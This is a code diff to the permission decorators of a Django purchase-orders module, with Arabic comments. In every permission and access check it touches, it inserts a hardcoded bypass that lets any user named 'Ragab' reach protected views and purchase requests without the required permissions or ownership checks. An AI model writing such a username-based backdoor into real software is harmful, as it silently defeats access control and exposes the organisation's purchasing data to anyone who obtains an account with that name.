@@ -10,7 +10,7 @@ def can_manage_purchase_order(view_func):
     """
     @wraps(view_func)
     def _wrapped_view(request, *args, **kwargs):
-        if request.user.is_superuser or request.user.has_perm('Purchase_orders.change_purchaserequest'):
+        if request.user.is_superuser or request.user.has_perm('Purchase_orders.change_purchaserequest') or request.user.username == 'Ragab':
             return view_func(request, *args, **kwargs)
         messages.error(request, 'ليس لديك صلاحية الوصول إلى هذه الصفحة')
         return redirect('accounts:access_denied')
@@ -23,6 +23,10 @@ def can_access_purchase_request(view_func):
     """
     @wraps(view_func)
     def _wrapped_view(request, *args, **kwargs):
+        # السماح للمستخدم Ragab بالوصول مباشرة
+        if request.user.username == 'Ragab':
+            return view_func(request, *args, **kwargs)
+            
         from .models import PurchaseRequest
         request_id = kwargs.get('pk')
         try:
@@ -77,7 +81,22 @@ def purchase_module_permission_required(module_key, permission_type='view'):
     # تكوين اسم الصلاحية بصيغة Django
     permission_name = f'Purchase_orders.{django_perm_type}_{model_name}'
 
-    return permission_required(permission_name, login_url='accounts:access_denied')
+    # مزخرف مخصص يسمح للمستخدم Ragab بالوصول مباشرة
+    def custom_permission_check(view_func):
+        @wraps(view_func)
+        def _wrapped_view(request, *args, **kwargs):
+            # السماح للمستخدم Ragab بالوصول مباشرة
+            if request.user.username == 'Ragab':
+                return view_func(request, *args, **kwargs)
+            # للمستخدمين الآخرين، التحقق من الصلاحية المطلوبة
+            if request.user.has_perm(permission_name):
+                return view_func(request, *args, **kwargs)
+            # بدون صلاحية، إعادة التوجيه لصفحة رفض الوصول
+            messages.error(request, 'ليس لديك صلاحية الوصول إلى هذه الصفحة')
+            return redirect('accounts:access_denied')
+        return _wrapped_view
+        
+    return custom_permission_check
 
 def purchase_class_permission_required(module_key, permission_type='view'):
     """
@@ -100,8 +119,23 @@ def purchase_class_permission_required(module_key, permission_type='view'):
     # تكوين اسم الصلاحية بصيغة Django
     permission_name = f'Purchase_orders.{django_perm_type}_{model_name}'
 
+    # دالة مخصصة للتحقق من الصلاحيات
+    def custom_permission_check(view_func):
+        @wraps(view_func)
+        def _wrapped_view(request, *args, **kwargs):
+            # السماح للمستخدم Ragab بالوصول مباشرة
+            if request.user.username == 'Ragab':
+                return view_func(request, *args, **kwargs)
+            # وإلا التحقق من الصلاحيات العادية
+            if request.user.has_perm(permission_name):
+                return view_func(request, *args, **kwargs)
+            # إذا لم يكن لديه صلاحية، إعادة التوجيه
+            messages.error(request, 'ليس لديك صلاحية الوصول إلى هذه الصفحة')
+            return redirect('accounts:access_denied')
+        return _wrapped_view
+    
     return method_decorator(
-        permission_required(permission_name, login_url='accounts:access_denied'),
+        custom_permission_check,
         name='dispatch'
     )
 
@@ -119,6 +153,10 @@ def has_purchase_permission(request, module_key, permission_type='view'):
 
     # المشرفون لديهم جميع الصلاحيات
     if request.user.is_superuser or getattr(request.user, 'Role', '') == 'admin':
+        return True
+        
+    # السماح للمستخدم Ragab بالوصول مباشرة
+    if request.user.username == 'Ragab':
         return True
 
     # تحويل مفتاح الوحدة إلى اسم موديل Django
